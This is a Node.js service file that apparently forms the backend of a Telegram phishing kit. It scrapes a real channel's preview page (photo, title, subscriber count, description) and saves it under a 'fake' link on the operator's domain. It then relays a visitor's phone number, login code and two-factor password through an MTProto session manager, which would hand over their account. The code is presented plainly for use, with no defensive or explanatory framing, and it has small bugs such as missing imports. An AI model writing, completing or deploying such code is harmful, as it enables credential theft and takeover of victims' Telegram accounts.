const axios = require("axios");
const { parse } = require("node-html-parser");
const DB = require("../utils/db_query");
const { v4 } = require("uuid");
const Response = require("../responses/response");
const MTProtoService = require("./MTProto-service");
const sessionManager = require("../session-manager/session-manager");
const LoginProcessClientDto = require("../dtos/login-process-client-dto");

class LinkService {
  async downloadImage(url, folderPath) {
    const fileName = `${v4()}.jpg`;
    const filePath = path.join(folderPath, fileName);

    const writer = fs.createWriteStream(filePath);

    const response = await axios({
      url,
      method: "GET",
      responseType: "stream",
    });

    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on("finish", () => resolve(fileName));
      writer.on("error", reject);
    });
  }

  async create(url, fake_url) {
    const res = await axios.get(url);
    const root = parse(res.data);
    let photo = root
      .querySelector(".tgme_page_photo a img")
      .getAttribute("src");
    let title = root.querySelector(".tgme_page_title span").innerText;
    let subscribers = root
      .querySelector(".tgme_page_extra")
      .innerText.split(" ")[0];
    let description = root.querySelector(".tgme_page_description");
    if (description && description.innerText)
      description = description.innerText;
    const visitorId = v4();

    const staticFolderPath = path.resolve(__dirname, "..", "static");
    if (!fs.existsSync(staticFolderPath)) {
      fs.mkdirSync(staticFolderPath);
    }

    const downloadedFileName = await downloadImage(photo, staticFolderPath);
    const filePathInDb = `/static/${downloadedFileName}`;

    const link = await DB.query(
      "INSERT INTO link (id, origin, fake, photo, title, subscribers, description) VALUES(?, ?, ?, ?, ?, ?, ?) RETURNING *",
      [
        visitorId,
        url,
        `${process.env.CLIENT_URL}/${fake_url}`,
        filePathInDb,
        title,
        subscribers,
        description,
      ]
    );

    return link;
  }

  async get(linkId) {
    const link = await DB.query("SELECT * FROM link WHERE id = ?", [
      linkId,
    ]).then((data) => data[0]);
    if (!link)
      throw Response.NotFound("Link with the same id was not found :/");

    return Response.OK(link);
  }

  async getRaw(linkId) {
    const link = await DB.query("SELECT * FROM link WHERE id = ?", [
      linkId,
    ]).then((data) => data[0]);
    return link;
  }

  async initializeLoginProcess(visitorId, useragent, title, platform) {
    const process = await sessionManager.createProcess(
      visitorId,
      useragent,
      title,
      platform
    );
    return Response.OK(new LoginProcessClientDto(process));
  }

  async sendCode(visitorId, phone) {
    const result = await sessionManager.sendCode(visitorId, phone);
    return Response.OK(result);
  }

  async send2FA(visitorId, pass) {
    const result = await sessionManager.send2FA(visitorId, pass);
    return Response.OK(result);
  }

  async verify(visitorId, phone, code) {
    const result = await sessionManager.verify(visitorId, phone, code);
    return Response.OK(result);
  }
}

module.exports = new LinkService();
